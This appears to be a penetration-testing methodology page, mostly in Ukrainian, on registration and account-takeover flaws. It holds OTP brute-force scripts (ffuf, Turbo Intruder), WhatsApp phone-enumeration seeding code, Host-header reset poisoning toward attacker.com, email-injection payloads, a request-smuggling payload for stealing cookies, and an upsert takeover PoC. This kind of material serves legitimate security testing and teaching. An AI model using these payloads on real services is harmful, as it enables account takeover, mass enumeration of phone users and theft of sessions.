# Вразливості реєстрації та захоплення облікових записів

{{#include ../banners/hacktricks-training.md}}

## Захоплення облікового запису при реєстрації

### Дубльована реєстрація

- Спробуйте зареєструватися з уже існуючим username
- Перевірте варіації email:
- великі літери
- +1@
- додайте крапку в email
- спеціальні символи в локальній частині email (%00, %09, %20)
- Додайте пробіли після email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Спробуйте трюки каноналізації провайдера email (залежить від сервісу):
- Gmail ігнорує крапки та subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` доставляються на `victim@gmail.com`
- Деякі провайдери нечутливі до регістру в локальній частині
- Деякі провайдери приймають unicode confusables. Спробуйте гомогліфи та soft hyphen `\u00AD` в локальній частині
- Зловживайте цим, щоб: обійти перевірки унікальності, отримати дубльовані акаунти/workspace invites, або блокувати реєстрації жертви (тимчасовий DoS) під час підготовки захоплення

### Username Enumeration

Check if you can figure out when a username has already been registered inside the application.

- Different error messages or HTTP status codes
- Timing differences (existing user may trigger lookup to IdP/DB)
- Registration form autofill of profile data for known emails
- Check team/invite flows: entering an email may reveal whether an account exists

### Password Policy

Creating a user check the password policy (check if you can use weak passwords).\
In that case you may try to bruteforce credentials.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)щоб дізнатися, як намагатися захопити акаунти або витягувати інформацію через **SQL Injections** у формах реєстрації.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Зміна email

Після реєстрації спробуйте змінити email і перевірте, чи правильно проходить валідація, або чи можна змінити його на довільний email.

### Додаткові перевірки

- Перевірте, чи можна використовувати **disposable emails** (mailinator, yopmail, 1secmail, etc.) або обійти блок-лист за допомогою subaddressing, наприклад `victim+mailinator@gmail.com`
- **Довгий пароль** (>200) призводить до **DoS**
- **Перевірте rate limits при створенні акаунтів**
- Використовуйте username@**burp_collab**.net і аналізуйте **callback**
- Якщо використовується верифікація номеру телефону, перевірте граничні випадки парсингу/ін'єкцій номеру

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Phone-number–centric messengers expose a **presence oracle** whenever the client syncs contacts. Replaying WhatsApp’s discovery requests historically delivered **>100M lookups per hour**, enabling near-complete account enumerations.

**Attack workflow**

1. **Instrument an official client** to capture the address-book upload request (authenticated blob of normalized E.164 numbers). Replay it with attacker-generated numbers while reusing the same cookies/device token.
2. **Batch numbers per request**: WhatsApp accepts thousands of identifiers and returns registered/unregistered plus metadata (business, companion, etc.). Analyze responses offline to build target lists without messaging victims.
3. **Horizontally scale** enumeration with SIM banks, cloud devices, or residential proxies so per-account/IP/ASN throttling never triggers.

**Dialing-plan modeling**

Model each country’s dialing plan to skip invalid candidates. The NDSS dataset (`country-table.*`) lists country codes, adoption density, and platform split so you can prioritize high-hit ranges. Example seeding code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Надавайте пріоритет префіксам, які відповідають реальним розподілам (Mobile Country Code + National Destination Code), перш ніж запитувати oracle, щоб зберегти корисну пропускну здатність.

**Turning enumerations into targeted attacks**

- Подавайте leaked phone numbers (e.g., Facebook’s 2021 breach) в oracle, щоб дізнатися, які ідентичності ще активні перед phishing, SIM-swapping, або spamming.
- Slice censuses за country/OS/app type, щоб знайти регіони з слабким SMS-фільтруванням або великим проникненням WhatsApp Business для локалізованого social engineering.

**Public-key reuse correlation**

WhatsApp exposes each account’s X25519 identity key під час встановлення сесії. Request identity material для кожного enumerated номера і дедуплікуйте public keys, щоб виявити account farms, cloned clients або insecure firmware — shared keys деанонімізують multi-SIM operations.

## Weak Email/Phone Verification (OTP/Magic Link)

Потоки реєстрації часто підтверджують володіння через числовий OTP або magic-link токен. Типові вади:

- Guessable або короткий OTP (4–6 digits) без ефективного rate limiting або відстеження IP/device. Спробуйте паралельні вгадування та header/IP rotation.
- OTP reuse між діями або акаунтами, або відсутність прив'язки до конкретного user/action (наприклад, той самий код працює для login і signup, або працює після зміни email).
- Multi-value smuggling: деякі backends приймають кілька кодів і перевіряють, чи відповідає будь-який. Спробуйте:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: відрізняйте wrong vs expired vs wrong-user коди за статусом/повідомленням/довжиною тіла.
- Токени не стають недійсними після успіху або після зміни password/email.
- Verification token не прив'язаний до user agent/IP, що дозволяє завершення перевірки cross-origin зі сторінок, контрольованих attacker.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Паралельні/конкурентні вгадування для обходу послідовних блокувань (використовуйте Turbo Intruder у Burp):

<details>
<summary>Фрагмент Turbo Intruder для масової відправки спроб 6‑digit OTP</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (перед тим як жертва зареєструється)

Потужний клас проблем виникає, коли атакуючий виконує дії з електронною поштою жертви до того, як вона створить свій обліковий запис, а потім пізніше відновлює доступ.

Ключові техніки для тестування (адаптуйте під потоки цілі):

- Classic–Federated Merge
  - Attacker: реєструє classic account з email жертви і встановлює пароль
  - Victim: пізніше реєструється через SSO (той самий email)
  - Небезпечні злиття можуть залишити обидві сторони увійденими або відновити доступ атакуючого
- Unexpired Session Identifier
  - Attacker: створює account і тримає довготривалу session (не виходить)
  - Victim: відновлює/встановлює пароль і починає користуватися акаунтом
  - Перевірте, чи старі sessions залишаються дійсними після reset або ввімкнення MFA
- Trojan Identifier
  - Attacker: додає вторинний identifier до попередньо створеного акаунту (телефон, додатковий email, або прив'язує свій IdP)
  - Victim: скидає пароль; пізніше атакуючий використовує trojan identifier для reset/login
- Unexpired Email Change
  - Attacker: ініціює зміну email на attacker mail і утримує підтвердження
  - Victim: відновлює акаунт та починає ним користуватися
  - Attacker: пізніше завершує очікувану зміну email, щоб вкрасти акаунт
- Non‑Verifying IdP
  - Attacker: використовує IdP, який не перевіряє володіння email, щоб заявити `victim@…`
  - Victim: реєструється класичним шляхом
  - Сервіс зливає по email без перевірки `email_verified` або локальної перевірки

Практичні поради

- Harvest flows and endpoints from web/mobile bundles. Шукайте classic signup, SSO linking, email/phone change та password reset endpoints.
- Створіть реалістичну автоматизацію, щоб утримувати sessions живими, поки ви перевіряєте інші flows.
- Для SSO-тестів розгорніть тестовий OIDC provider і випускайте токени з `email` claims для адреси жертви та `email_verified=false`, щоб перевірити, чи RP довіряє unverified IdPs.
- Після будь-якого password reset або email change перевірте, що:
  - всі інші sessions і tokens анулюються,
  - очікувані можливості зміни email/телефону скасовано,
  - раніше прив'язані IdPs/emails/phones повторно перевірені.

Примітка: детальна методологія та кейси цих технік документовані в Microsoft’s pre‑hijacking research (див. References наприкінці).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR на параметрах API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Атакуючий повинен увійти зі своїм обліковим записом і перейти до функції **Змінити пароль**.
2. Запустіть Burp Suite і перехопіть запит
3. Відправте його на вкладку repeater і змініть параметри: User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Слабкий токен скидання пароля <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Токен скидання пароля має генеруватися випадково і бути унікальним кожного разу.\
Спробуйте визначити, чи токен експірірує, чи він завжди той самий — в деяких випадках алгоритм генерації слабкий і може бути вгаданий. Наступні змінні можуть використовуватися алгоритмом.

- Мітка часу
- Ідентифікатор користувача
- Email користувача
- Ім'я та прізвище
- Дата народження
- Криптографія
- Лише числа
- Коротка послідовність токена ( characters between \[A-Z,a-z,0-9])
- Повторне використання токена
- Дата закінчення терміну дії токена

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Викличте запит на скидання пароля через API/UI для конкретного email, наприклад: test@mail.com
2. Проінспектуйте відповідь сервера і перевірте на наявність `resetToken`
3. Потім використайте токен в URL типу `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Зареєструйтесь в системі з username ідентичним username жертви, але з пробілами, вставленими перед і/або після username. Наприклад: `"admin "`
2. Запросіть скидання пароля з вашим шкідливим username.
3. Використайте токен, надісланий на вашу пошту, і скиньте пароль жертви.
4. Увійдіть в обліковий запис жертви з новим паролем.

Платформа CTFd була вразлива до цієї атаки.\
Див.: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Захоплення облікового запису через Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Знайдіть XSS в додатку або на субдомені, якщо cookies scoped до батьківського домену: `*.domain.com`
2. Leak поточне **sessions cookie**
3. Аутентифікуйтесь як користувач, використовуючи cookie

### Захоплення облікового запису через HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Використайте **smuggler** щоб визначити тип HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Сформуйте запит, який перезапише `POST / HTTP/1.1` наступними даними:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` з метою відкрити redirect жертв на burpcollab і вкрасти їх cookies\
3. Фінальний запит може виглядати так:
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Звіти на Hackerone про експлуатацію цієї вразливості\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Створіть payload для CSRF, наприклад: “HTML form with auto submit for a password change”
2. Надішліть payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token might be used to authenticate an user.

- Відредагуйте JWT, підставивши інший User ID / Email
- Перевірте, чи слабкий підпис JWT

{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Деякі signup handlers виконують upsert, коли вказаний email вже існує. Якщо endpoint приймає мінімальний body з email та password і не вимагає перевірки прав власності, відправка email жертви перезапише їхній password до автентифікації.

- Виявлення: збирайте назви endpoint з bundled JS (або трафіку mobile app), потім фузьте базові шляхи, такі як /parents/application/v4/admin/FUZZ за допомогою ffuf/dirsearch.
- Підказки щодо методу: GET, що повертає повідомлення на кшталт "Only POST request is allowed." часто вказує на правильний HTTP-метод та на те, що очікується JSON body.
- Приклад мінімального body, виявлений у реальних умовах:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Приклад PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Вплив: Повне Account Takeover (ATO) без жодного reset token, OTP або підтвердження електронної пошти.

## Джерела

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
